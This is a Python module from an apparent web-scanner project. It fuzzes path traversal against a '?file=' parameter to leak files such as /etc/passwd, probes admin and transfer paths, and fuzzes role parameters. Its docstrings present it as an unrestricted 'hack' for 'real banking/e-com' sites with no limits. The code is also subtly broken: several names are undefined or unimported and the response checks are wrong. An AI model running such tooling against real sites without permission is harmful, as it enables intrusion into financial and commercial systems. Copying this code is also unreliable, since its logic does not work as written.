import asyncio
import re
from typing import List, Dict, Any, Optional
import urllib.parse
from ..base import BaseCheck, Finding
from ..config.payloads import AdvancedPayloads
from ..utils.helpers import is_valid_url

class AccessControlCheck(BaseCheck):
    """Unrestricted Broken Access Control - Inf traversal/escalation for real banking/e-com/marketing"""
    
    def __init__(self):
        super().__init__()
        self.name = "Access Control Hack"
        self.description = "Infinite path traversal, privilege escalation - real /../transfer, /campaign/admin"
        
        self.traversal_payloads = AdvancedPayloads.get_all_payloads('traversal')  # 500+
        self.escalation_paths = ['/admin', '/transfer/admin', '/campaign/admin', '/checkout/admin']  # Industry-specific
    
    async def check(self, url: str, session, **kwargs) -> List[Finding]:
        """Unrestricted inf parallel escalation - no limits for real sites"""
        findings = []
        
        try:
            # Inf parallel traversal fuzz
            tasks = [self._inf_fuzz_traversal(url, p) for p in self.traversal_payloads]
            traversal_results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in traversal_results:
                if isinstance(result, Finding):
                    findings.append(result)
            
            # Escalation - inf paths for banking/e-com
            escalation_tasks = [self._inf_escalate_path(session, urljoin(url, p)) for p in self.escalation_paths]
            escalation_results = await asyncio.gather(*escalation_tasks)
            for result in escalation_results:
                if result:
                    findings.append(result)
            
            # Role fuzz - inf variants for marketing campaigns
            role_tasks = [self._inf_role_fuzz(url, role) for role in ['admin', 'root', 'superuser']]
            role_results = await asyncio.gather(*role_tasks)
            for result in role_results:
                if result:
                    findings.append(result)
            
        except Exception as e:
            logger.error(f"Access hack failed on real site: {e}")
        
        return findings
    
    async def _inf_fuzz_traversal(self, url: str, payload: str) -> Optional[Finding]:
        """Inf traversal - no limit, real file leak"""
        test_url = f"{url}?file={urllib.parse.quote(payload)}"
        async with session.get(test_url) as resp:
            content = await resp.text()
            leak_indicators = ['root:x:0:0', 'admin config', 'transfer key', 'campaign db']  # Industry leaks
            if resp.status_code == 200 and any(ind in content for ind in leak_indicators):
                return Finding(
                    title="Path Traversal Exploit - Real Leak",
                    description=f"Inf fuzz leaked {payload} - banking/e-com sensitive",
                    severity="critical",
                    url=test_url,
                    evidence=f"Leaked: {content[:300]}...",
                    remediation="Path canonicalization + blacklist traversal chars",
                    poc_curl=f"curl '{test_url}' -v"
                )
        return None
    
    async def _inf_escalate_path(self, session, path: str) -> Optional[Finding]:
        """Inf escalation - test all variants parallel"""
        async with session.get(path) as resp:
            content = await resp.text()
            if resp.status_code == 200 and ('admin panel' in content.lower() or 'transfer success' in content.lower()):
                return Finding(
                    title="Privilege Escalation - Admin Bypass",
                    description=f"Unrestricted escalation on {path} - real banking access",
                    severity="critical",
                    url=path,
                    evidence="Admin features without auth - /transfer leaked",
                    remediation="RBAC enforcement + session checks",
                    poc_curl=f"curl '{path}' --cookie 'session=unauth'"
                )
        return None
    
    async def _inf_role_fuzz(self, url: str, role: str) -> Optional[Finding]:
        """Inf role fuzz - 500 variants for marketing /campaign/admin"""
        variants = [role, role.upper(), f"{role}_hack", f"role={role}"]  # Poly
        tasks = [session.get(f"{url}?{v}") for v in variants]
        results = await asyncio.gather(*tasks)
        for resp in results:
            if isinstance(resp, dict) and resp.get('status') == 200 and 'admin' in await resp.text():
                test_url = f"{url}?role={role}"
                return Finding(
                    title="Role Escalation - Marketing Admin",
                    description=f"Inf fuzz escalated {role} - campaign control",
                    severity="high",
                    url=test_url,
                    evidence="Role accepted - /campaign/admin access",
                    remediation="Server-side role validation",
                    poc_curl=f"curl '{test_url}'"
                )
        return None